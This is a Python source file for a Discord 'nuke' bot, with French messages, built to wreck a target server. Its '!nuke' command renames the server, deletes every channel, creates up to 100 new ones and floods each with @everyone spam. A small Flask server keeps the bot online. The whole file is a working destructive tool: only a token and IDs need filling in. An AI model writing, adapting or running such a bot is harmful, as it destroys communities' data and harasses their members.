import os
import asyncio
import nextcord
from nextcord.ext import commands
from flask import Flask
from threading import Thread

TOKEN = "TOKEN HERE"

app = Flask(__name__)

@app.route("/")
def home():
    return "Bot en ligne !"

ALLOWED_USER = ALLOWED USER HERE
ALLOWED_GUILD = SERVER ATTACKED

MAX_CHANNELS = 100
SPAM_MESSAGES = 20

NUKE_STOP = False   

intents = nextcord.Intents.all()
bot = commands.Bot(command_prefix="!", intents=intents)


def allowed(ctx):
    return ctx.author.id == ALLOWED_USER and ctx.guild and ctx.guild.id == ALLOWED_GUILD


@bot.command()
async def stop(ctx):
    global NUKE_STOP
    if not allowed(ctx):
        return await ctx.send("❌ Pas le droit d'arrêter le nuke.")

    NUKE_STOP = True
    await ctx.send("🛑 **Nucléaire arrêté !**")


@bot.event
async def on_ready():
    print(f"Bot connecté en tant que {bot.user}")


@bot.command()
async def nuke(ctx, amount: int = 5):
    global NUKE_STOP
    NUKE_STOP = False

    if not allowed(ctx):
        return await ctx.send("❌ Tu n'as pas le droit d'utiliser cette commande.")

    amount = max(1, min(amount, MAX_CHANNELS))
    guild = ctx.guild

    # Changer le nom
    try:
        await guild.edit(name="nuked")
    except:
        pass

    # SUPPRESSION
    for channel in guild.channels:
        if NUKE_STOP:
            return await ctx.send("🛑 Nuke stoppé pendant la suppression.")
        try:
            await channel.delete()
            await asyncio.sleep(0.1)
        except:
            pass

    # CRÉATION DES NOUVEAUX CH
    new_channels = []
    for i in range(amount):
        if NUKE_STOP:
            return await ctx.send("🛑 Nuke stoppé pendant la création.")
        try:
            c = await guild.create_text_channel(f"nuked-{i+1}")
            new_channels.append(c)
            await asyncio.sleep(0.05)
        except:
            pass

    # SPAM
    for c in new_channels:
        for _ in range(SPAM_MESSAGES):
            if NUKE_STOP:
                return await ctx.send("🛑 Nuke stoppé pendant le spam.")
            try:
                await c.send("💥 @everyone Serveur NUKED 💥")
                await asyncio.sleep(0.03)
            except:
                pass

    await ctx.send("🔥 **NUKE TERMINÉ !**")


# FLASK THREAD
def run_flask():
    port = int(os.environ.get("PORT", 10000))
    app.run(host="0.0.0.0", port=port)

Thread(target=run_flask).start()
async def main():
    await bot.start(TOKEN)

if __name__ == "__main__":
    asyncio.run(main())

